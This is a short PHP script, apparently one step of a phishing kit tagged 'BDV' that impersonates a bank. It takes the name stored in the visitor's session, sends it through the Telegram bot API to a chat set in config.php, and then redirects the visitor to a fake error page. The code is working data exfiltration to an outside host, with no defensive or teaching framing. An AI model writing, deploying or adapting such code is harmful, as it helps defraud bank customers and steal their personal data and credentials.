<?php
// Iniciar sesión en PHP
session_start();

// Incluir la configuración de Telegram
include('config.php');

// Obtener el nombre de la sesión, o 'Desconocido' si no está establecido
$nombre = isset($_SESSION['nombre']) ? $_SESSION['nombre'] : 'Desconocido';

// Definir el mensaje que se enviará a Telegram
$mensaje = "BDV - 👤❌ \n\n👤Nombre: $nombre \nEnviando a error";

// URL de la API de Telegram con el token y el chat_id desde config.php
$api_url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($mensaje);

// Enviar el mensaje a Telegram
file_get_contents($api_url);

// Redirigir a error.html después de enviar el mensaje
header('Location: error.html');
exit();
?>
